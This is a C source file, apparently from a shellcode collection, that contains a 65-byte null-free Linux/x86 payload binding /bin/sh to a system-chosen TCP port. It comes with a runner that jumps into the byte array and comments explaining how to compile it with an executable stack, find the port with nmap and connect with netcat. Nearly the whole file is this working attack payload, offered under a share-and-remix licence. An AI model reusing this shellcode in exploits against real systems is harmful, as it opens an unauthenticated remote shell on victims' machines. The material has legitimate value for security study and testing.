/*

 Shell Bind TCP Random Port Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 With the great support from Tiago Natel, Sec Plus

   http://www.secplus.com.br/
   tiago4orion@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_bind_tcp_random_port_shellcode

 * 65 bytes
 * null-bytes free
 * the port number is set by the system and can be discovered using nmap
   (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)


 # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode.c -o shell_bind_tcp_random_port_shellcode
 # ./shell_bind_tcp_random_port_shellcode

 Testing
 # netstat -anp | grep shell
 # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
 # nc 127.0.0.1 port

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\xb3\x04\x52\x56"
"\x89\xe1\xcd\x80\xb0\x66\x43\x89\x54\x24\x08\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x52\x53\xeb\xca";

main ()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}